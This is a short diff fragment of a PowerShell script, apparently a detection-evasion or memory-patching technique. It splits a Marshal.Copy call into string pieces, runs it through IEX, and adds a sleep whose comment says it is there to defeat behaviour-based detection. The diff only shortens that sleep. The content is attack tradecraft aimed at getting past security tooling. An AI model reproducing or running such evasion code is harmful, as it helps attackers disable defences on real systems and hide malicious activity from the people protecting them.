@@ -61,7 +61,7 @@ $a='[System.Runtime.InteropServices.Marshal]::Co'
 $b='py($in, $zero, $pointer, $twelve)'
 
 # Add this to sleep to make it harder for the behaviour based detection to catch this script
-Start-Sleep 4
+Start-Sleep 2
 
 # Execute the marshal copy call
 IEX("$a{0}" -f $b)
